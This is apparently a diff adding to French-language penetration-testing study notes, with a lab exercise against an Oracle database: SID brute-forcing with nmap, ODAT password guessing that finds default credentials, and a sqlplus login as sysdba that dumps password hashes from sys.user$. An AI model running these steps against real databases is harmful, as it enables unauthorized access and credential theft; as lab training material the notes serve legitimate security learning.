@@ -230,7 +230,7 @@ LOGSTDBY_ADMINISTRATOR
 <SNIP>
 ```
 
-### récup de fichier
+## récup de fichier ODAT
 
 ```bash
 Jfou@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
@@ -284,4 +284,189 @@ utlfile commands:
 output configurations:
   --no-color                                 no color for output
   --output-file OUTPUTFILE                   save results in this file
+```
+
+## exercice 
+### Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
+
+#### nmap
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p1521 -sV 10.129.93.12 --open --script oracle-sid-brute
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 15:08 +0200
+Nmap scan report for 10.129.93.12
+Host is up (0.088s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+| oracle-sid-brute: 
+|_  XE
+
+```
+
+#### odat
+```bash
+┌──(kali㉿kali)-[~]
+└─$ odat/odat.py all -s 10.129.93.12 -d XE 
+[+] Target: 10.129.93.12:1521 (SID: XE) [all]
+[+] Checking if target 10.129.93.12:1521 is well configured for a connection...
+[+] According to a test, the TNS listener 10.129.93.12:1521 is well configured. Continue...
+
+[1] (10.129.93.12:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
+[+] The target is vulnerable to a remote TNS poisoning
+
+[2] (10.129.93.12:1521): Searching valid accounts on the XE SID
+Traceback (most recent call last):
+  File "/home/kali/odat/odat.py", line 817, in <module>
+    main()
+    ~~~~^^
+  File "/home/kali/odat/odat.py", line 812, in main
+    arguments.func(args)
+    ~~~~~~~~~~~~~~^^^^^^
+  File "/home/kali/odat/odat.py", line 137, in runAllModulesOnEachHost
+    runAllModules(args)
+    ~~~~~~~~~~~~~^^^^^^
+  File "/home/kali/odat/odat.py", line 254, in runAllModules
+    passwordGuesser = PasswordGuesser(args,
+    								  accountsFile=args['accounts-file'],
+    ...<4 lines>...
+    								  bothUpperLower=args['both-upper-lower'],
+    								  randomOrder=args['random-order'])
+  File "/home/kali/odat/PasswordGuesser.py", line 31, in __init__
+    self.accounts = self.__loadAccounts__()
+                    ~~~~~~~~~~~~~~~~~~~~~^^
+  File "/home/kali/odat/PasswordGuesser.py", line 57, in __loadAccounts__
+    f = open(self.accountsFile)
+FileNotFoundError: [Errno 2] No such file or directory: 'accounts/accounts.txt'
+
+
+┌──(kali㉿kali)-[~]
+└─$ cd odat 
+
+   
+┌──(kali㉿kali)-[~/odat]
+└─$ ./odat.py all -s 10.129.93.12 -d XE
+[+] Target: 10.129.93.12:1521 (SID: XE) [all]
+[+] Checking if target 10.129.93.12:1521 is well configured for a connection...
+[+] According to a test, the TNS listener 10.129.93.12:1521 is well configured. Continue...
+
+[1] (10.129.93.12:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
+[+] The target is vulnerable to a remote TNS poisoning
+
+[2] (10.129.93.12:1521): Searching valid accounts on the XE SID
+The login cis has already been tested at least once. What do you want to do:                                                                                                                         | ETA:  00:07:10 
+- stop (s/S)
+- continue and ask every time (a/A)
+- skip and continue to ask (p/P)
+- continue without to ask (c/C)
+c
+[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                                                                                       | ETA:  00:12:51 
+[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                                                                                       | ETA:  00:11:56 
+[!] Notice: 'dip' account is locked, so skipping this username for password                                                                                                                          | ETA:  00:10:47 
+[!] Notice: 'hr' account is locked, so skipping this username for password                                                                                                                           | ETA:  00:07:49 
+[!] Notice: 'mdsys' account is locked, so skipping this username for password######################                                                                                                  | ETA:  00:05:36 
+[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password######################################                                                                             | ETA:  00:04:12 
+[!] Notice: 'outln' account is locked, so skipping this username for password###################################################                                                                     | ETA:  00:03:43 
+[+] Valid credentials found: scott/tiger. Continue...                                                                                                                                                                 
+[!] Notice: 'xdb' account is locked, so skipping this username for password##################################################################################################################        | ETA:  00:00:23 
+100% |###############################################################################################################################################################################################| Time: 00:09:40 
+[+] Accounts found on 10.129.93.12:1521/sid:XE: 
+scott/tiger
+ 
+
+
+```
+ou 
+
+```bash
+┌──(kali㉿kali)-[~/odat]
+└─$ odat/odat.py all -s 10.129.93.12 -d XE --accounts-file /home/kali/odat/accounts/accounts.txt
+```
+
+#### sqlplus
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sqlplus scott/tiger@10.129.93.12/XE as sysdba
+
+SQL*Plus: Release 19.0.0.0.0 - Production on Mon Aug 3 15:24:19 2026
+Version 19.6.0.0.0
+
+Copyright (c) 1982, 2019, Oracle.  All rights reserved.
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SQL> select name, password from sys.user$;
+
+NAME			       PASSWORD
+------------------------------ ------------------------------
+SYS			       FBA343E7D6C8BC9D
+PUBLIC
+CONNECT
+RESOURCE
+DBA
+SYSTEM			       B5073FE1DE351687
+SELECT_CATALOG_ROLE
+EXECUTE_CATALOG_ROLE
+DELETE_CATALOG_ROLE
+OUTLN			       4A3BA55E08595C81
+EXP_FULL_DATABASE
+
+NAME			       PASSWORD
+------------------------------ ------------------------------
+IMP_FULL_DATABASE
+LOGSTDBY_ADMINISTRATOR
+DBFS_ROLE
+DIP			       CE4A36B8E06CA59C
+AQ_ADMINISTRATOR_ROLE
+AQ_USER_ROLE
+DATAPUMP_EXP_FULL_DATABASE
+DATAPUMP_IMP_FULL_DATABASE
+ADM_PARALLEL_EXECUTE_TASK
+GATHER_SYSTEM_STATISTICS
+XDB_WEBSERVICES_OVER_HTTP
+
+NAME			       PASSWORD
+------------------------------ ------------------------------
+ORACLE_OCM		       5A2E026A9157958C
+RECOVERY_CATALOG_OWNER
+SCHEDULER_ADMIN
+HS_ADMIN_SELECT_ROLE
+HS_ADMIN_EXECUTE_ROLE
+HS_ADMIN_ROLE
+OEM_ADVISOR
+OEM_MONITOR
+DBSNMP			       SNIP
+APPQOSSYS		       519D632B7EE7F63A
+PLUSTRACE
+
+NAME			       PASSWORD
+------------------------------ ------------------------------
+CTXSYS			       D1D21CA56994CAB6
+CTXAPP
+XDB			       E76A6BD999EF9FF1
+ANONYMOUS		       anonymous
+XDBADMIN
+XDB_SET_INVOKER
+AUTHENTICATEDUSER
+XDB_WEBSERVICES
+XDB_WEBSERVICES_WITH_PUBLIC
+XS$NULL 		       DC4FCC8CB69A6733
+_NEXT_USER
+
+NAME			       PASSWORD
+------------------------------ ------------------------------
+MDSYS			       72979A94BAD2AF80
+HR			       4C6D73C3E8B0F0DA
+FLOWS_FILES		       30128982EA6D4A3D
+APEX_PUBLIC_USER	       4432BA224E12410A
+APEX_ADMINISTRATOR_ROLE
+APEX_040000		       E7CE9863D7EEB0A4
+SCOTT			       F894844C34402B67
+
+51 rows selected.
+
 ```
